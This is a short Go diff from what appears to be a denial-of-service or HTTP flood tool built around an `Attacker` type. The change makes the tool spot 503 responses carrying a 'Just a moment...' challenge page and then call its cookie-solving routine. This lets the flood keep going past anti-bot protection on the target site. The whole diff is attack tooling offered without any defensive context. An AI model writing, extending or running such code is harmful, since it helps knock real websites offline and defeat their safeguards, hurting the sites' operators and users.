@@ -5,6 +5,7 @@ import (
 	crand "crypto/rand"
 	"crypto/tls"
 	"fmt"
+	"golang.org/x/net/html"
 	"math"
 	"math/big"
 	"math/rand"
@@ -256,12 +257,37 @@ func (a *Attacker) CheckResponse(expired chan bool) {
 			time.Sleep(time.Second)
 			continue
 		}
-		if r.StatusCode == 503 || r.StatusCode == 403 {
+		if r.StatusCode == 403 {
 			a.SolveCookie()
+		} else if r.StatusCode == 503 {
+			parsed, err := html.Parse(r.Body)
+			if err != nil {
+				time.Sleep(time.Second)
+				continue
+			}
+			if GetTitle(parsed) == "Just a moment..." {
+				a.SolveCookie()
+			}
 		}
 		r.Body.Close()
 		time.Sleep(time.Second)
 	}
+}
+
+func GetTitle(n *html.Node) string {
+	if n.Type == html.ElementNode && n.Data == "title" {
+		var title bytes.Buffer
+		if err := html.Render(&title, n.FirstChild); err != nil {
+			panic(err)
+		}
+		return strings.TrimSpace(title.String())
+	}
+	for c := n.FirstChild; c != nil; c = c.NextSibling {
+		if title := GetTitle(c); title != "" {
+			return title
+		}
+	}
+	return ""
 }
 
 func (a *Attacker) Worker(expired chan bool) {
